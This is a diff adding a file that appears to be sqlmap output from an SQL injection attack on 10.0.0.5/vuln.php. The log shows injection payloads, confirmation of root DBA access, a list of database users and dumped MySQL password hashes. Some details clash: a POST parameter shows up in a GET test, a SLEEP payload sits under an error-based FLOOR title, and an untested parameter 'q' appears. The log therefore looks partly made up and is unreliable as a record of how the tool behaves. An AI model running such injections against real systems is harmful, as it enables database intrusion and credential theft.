@@ -1,0 +1,36 @@
+[09:10:00] [INFO] testing URL 'http://10.0.0.5/vuln.php?id=1'
+[09:10:00] [INFO] testing connection to the target URL
+[09:10:01] [INFO] checking if the target is protected by some kind of WAF/IPS
+[09:10:02] [INFO] testing if GET parameter 'id' is dynamic
+[09:10:03] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="hac")
+[09:10:05] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
+[09:10:06] [INFO] POST parameter 'user' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+[09:10:07] [INFO] the back-end DBMS is MySQL
+[09:10:08] [INFO] fetching current user
+current user: 'root@localhost'
+[09:10:08] [INFO] current user is DBA: True
+
+sqlmap identified the following injection point(s) with a total of 53 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 9561=9561
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1 AND (SELECT 1234 FROM (SELECT(SLEEP(0)))abc)
+---
+[09:10:20] [INFO] fetching database users
+database management system users [3]:
+[*] 'app'@'localhost'
+[*] 'root'@'localhost'
+[*] 'web'@'10.0.0.5'
+[09:10:22] [INFO] fetching database users password hashes
+database management system users password hashes:
+[*] root [1]:
+    password hash: *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
+[*] web [2]:
+    password hash: *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9
+    password hash: NULL
+[09:10:30] [WARNING] parameter 'q' does not seem to be injectable
